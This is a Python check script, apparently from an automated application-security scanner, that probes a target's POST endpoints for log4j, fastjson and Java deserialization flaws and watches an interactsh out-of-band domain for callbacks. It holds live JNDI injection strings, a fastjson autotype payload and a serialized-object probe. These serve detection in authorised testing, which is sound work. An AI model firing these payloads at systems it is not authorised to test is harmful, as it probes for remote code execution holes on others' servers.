"""应用安全：RCE 深度（log4j/fastjson/OAST/Java 反序列化探测，只读）。"""
import sys as _sys
from pathlib import Path as _Path
_sys.path.insert(0, str(_Path(__file__).resolve().parents[1]))
from runner import public_config as _pub
import json
import os
import random
import time
import requests
import urllib3
try:
    import gate_common as gc
except ImportError:
    from checks import gate_common as gc
urllib3.disable_warnings()
BASE = gc.base_url()
ROOT = gc.ROOT

def main():
    tok = gc.token('admin02')
    oast_path = os.path.join(ROOT, 'adapters', 'oast', 'oast_state.json')
    if not tok:
        gc.emit('rce_deserialization', 'application', 'BLOCKED', [], blocked_reason='缺少 admin02 token')
        return
    domain = ''
    if os.path.exists(oast_path):
        try:
            domain = json.load(open(oast_path, encoding='utf-8')).get('domain', '')
        except Exception:
            pass
    endpoints = [e for e in gc.endpoint_keys() if e.get('method') == 'POST' and (e.get('body_keys') or [])][:8]
    findings = []
    tested = []
    h = {'Origin': BASE, 'Referer': BASE + '/ui/login', 'User-Agent': 'Mozilla/5.0', 'token': tok, 'Content-Type': 'application/json'}
    tok_oast = 'rced' + str(random.randint(100000, 999999))
    for ep in endpoints:
        path = ep['path']
        keys = ep.get('body_keys') or ['']
        body = {k: '' for k in keys}
        if domain:
            body[keys[0]] = json.dumps({'@type': 'java.net.Inet4Address', 'val': f'{tok_oast}.{domain}'})
        try:
            r = requests.post(BASE + path, headers=h, params={'t': str(int(time.time() * 1000))}, json=body, timeout=12, verify=False)
            tested.append({'path': path, 'kind': 'fastjson', 'http': r.status_code})
        except Exception:
            pass
        if domain:
            hh = dict(h)
            hh['X-Api-Version'] = '${jndi:ldap://%s.%s/x}' % (tok_oast, domain)
            try:
                r = requests.post(BASE + path, headers=hh, params={'t': str(int(time.time() * 1000))}, json={keys[0]: '${jndi:dns://%s.%s/x}' % (tok_oast, domain)}, timeout=12, verify=False)
                tested.append({'path': path, 'kind': 'log4j', 'http': r.status_code})
            except Exception:
                pass
    for ep in endpoints[:3]:
        try:
            r = requests.post(BASE + ep['path'], headers={**h, 'Content-Type': 'application/x-java-serialized-object'}, data=b'\xac\xed\x00\x05secauto', params={'t': str(int(time.time() * 1000))}, timeout=10, verify=False)
            tested.append({'path': ep['path'], 'kind': 'java-serialized', 'http': r.status_code})
        except Exception:
            pass
    if domain:
        time.sleep(6)
        jsonl = os.path.join(ROOT, 'tools_cache', 'interactsh', 'interactions.jsonl')
        if os.path.exists(jsonl):
            for line in open(jsonl, encoding='utf-8', errors='replace'):
                if tok_oast in line:
                    findings.append(gc.finding('RCE-DESER-OAST', 'critical', 'log4j/fastjson 探测触发 OAST 回调', evidence=line[:300], remediation='升级 log4j/fastjson；关闭 JNDI；WAF'))
                    break
    gc.emit('rce_deserialization', 'application', 'PASS', findings, summary=json.dumps({'probes': tested, 'oast_domain': bool(domain)}, ensure_ascii=False)[:700])
if __name__ == '__main__':
    main()
